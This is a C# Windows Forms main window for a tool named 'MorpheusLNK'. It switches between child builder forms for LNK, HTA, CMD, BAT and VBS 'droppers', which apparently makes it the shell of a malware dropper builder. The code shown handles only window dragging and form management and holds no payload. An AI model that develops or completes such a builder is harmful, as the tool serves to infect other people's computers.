using System;
using System.Drawing;
using System.Windows.Forms;

namespace MorpheusLNK
{
    public partial class Form1 : Form
    {
        LNK_DROPPER lnkBuilderForm;
        HTA_DROPPER htaBuilderForm;
        CMD_DROPPER cmdBuilderForm;
        BAT_DROPPER batBuilderForm;
        VBS_DROPPER vbsBuilderForm;
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;

        public Form1()
        {
            InitializeComponent();
        }

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void panel2_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }

        private void panel2_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void closeBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void lnkBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Show();
        }


        private void lnkNewBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Hide();

            if (htaBuilderForm != null && !htaBuilderForm.IsDisposed)
            {
                htaBuilderForm.Close();
            }

            if (lnkBuilderForm == null)
            {
                lnkBuilderForm = new LNK_DROPPER();
                lnkBuilderForm.FormClosed += LnkBuilderForm_FormClosed;
                lnkBuilderForm.ControlBox = false;
                lnkBuilderForm.StartPosition = FormStartPosition.Manual;
                lnkBuilderForm.Location = new Point(0, 0);
                lnkBuilderForm.Size = new Size(732 * 1, 450 * 1);
                lnkBuilderForm.MdiParent = this;
                lnkBuilderForm.Show();
            }
            else
            {
                lnkBuilderForm.Activate();
            }
        }


        private void htaBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Hide();

            if (lnkBuilderForm != null && !lnkBuilderForm.IsDisposed)
            {
                lnkBuilderForm.Close();
            }

            LayoutMdi(MdiLayout.TileHorizontal);

            if (htaBuilderForm == null || htaBuilderForm.IsDisposed)
            {
                htaBuilderForm = new HTA_DROPPER();
                htaBuilderForm.FormClosed += HtaBuilderForm_FormClosed;
                htaBuilderForm.ControlBox = false;
                htaBuilderForm.StartPosition = FormStartPosition.Manual;
                htaBuilderForm.Location = new Point(0, 0);
                htaBuilderForm.Size = new Size(732 * 1, 450 * 1);
                htaBuilderForm.MdiParent = this;
                htaBuilderForm.Show();
            }
            else
            {
                htaBuilderForm.Activate();
            }
        }

        private void cmdBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Hide();

            if (lnkBuilderForm != null && !lnkBuilderForm.IsDisposed)
            {
                lnkBuilderForm.Close();
            }

            if (htaBuilderForm != null && !htaBuilderForm.IsDisposed)
            {
                htaBuilderForm.Close();
            }

            LayoutMdi(MdiLayout.TileHorizontal);

            if (cmdBuilderForm == null || cmdBuilderForm.IsDisposed)
            {
                cmdBuilderForm = new CMD_DROPPER();
                cmdBuilderForm.FormClosed += CmdBuilderForm_FormClosed;
                cmdBuilderForm.ControlBox = false;
                cmdBuilderForm.StartPosition = FormStartPosition.Manual;
                cmdBuilderForm.Location = new Point(0, 0);
                cmdBuilderForm.Size = new Size(732 * 1, 450 * 1); 
                cmdBuilderForm.MdiParent = this;
                cmdBuilderForm.Show();
            }
            else
            {
                cmdBuilderForm.Activate();
            }
        }


        private void batBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Hide();

            if (lnkBuilderForm != null && !lnkBuilderForm.IsDisposed)
            {
                lnkBuilderForm.Close();
            }

            if (htaBuilderForm != null && !htaBuilderForm.IsDisposed)
            {
                htaBuilderForm.Close();
            }

            LayoutMdi(MdiLayout.TileHorizontal);

            if (batBuilderForm == null || batBuilderForm.IsDisposed)
            {
                batBuilderForm = new BAT_DROPPER();
                batBuilderForm.FormClosed += BatBuilderForm_FormClosed ;
                batBuilderForm.ControlBox = false;
                batBuilderForm.StartPosition = FormStartPosition.Manual; 
                batBuilderForm.Location = new Point(0, 0); 
                batBuilderForm.Size = new Size(732 * 1, 450 * 1); 
                batBuilderForm.MdiParent = this;
                batBuilderForm.Show();
            }
            else
            {
                batBuilderForm.Activate();
            }

        }



        private void vbsBuilder_btn_Click(object sender, EventArgs e)
        {
            backgroundPanel.Hide();

            if (lnkBuilderForm != null && !lnkBuilderForm.IsDisposed)
            {
                lnkBuilderForm.Close();
            }

            if (htaBuilderForm != null && !htaBuilderForm.IsDisposed)
            {
                htaBuilderForm.Close();
            }

            LayoutMdi(MdiLayout.TileHorizontal);


            if (vbsBuilderForm == null || vbsBuilderForm.IsDisposed)
            {
                vbsBuilderForm = new VBS_DROPPER();
                vbsBuilderForm.FormClosed += VbsBuilderForm_FormClosed;
                vbsBuilderForm.ControlBox = false;
                vbsBuilderForm.StartPosition = FormStartPosition.Manual;
                vbsBuilderForm.Location = new Point(0, 0);
                vbsBuilderForm.Size = new Size(732 * 1, 450 * 1);
                vbsBuilderForm.MdiParent = this;
                vbsBuilderForm.Show();
            }
            else
            {
                vbsBuilderForm.Activate();
            }
        }

        private void VbsBuilderForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            vbsBuilderForm = null;
        }

        private void BatBuilderForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            batBuilderForm = null;
        }

        private void CmdBuilderForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            cmdBuilderForm = null;
        }

        private void HtaBuilderForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            htaBuilderForm = null;
        }


        private void LnkBuilderForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            lnkBuilderForm = null;
        }

    }
}
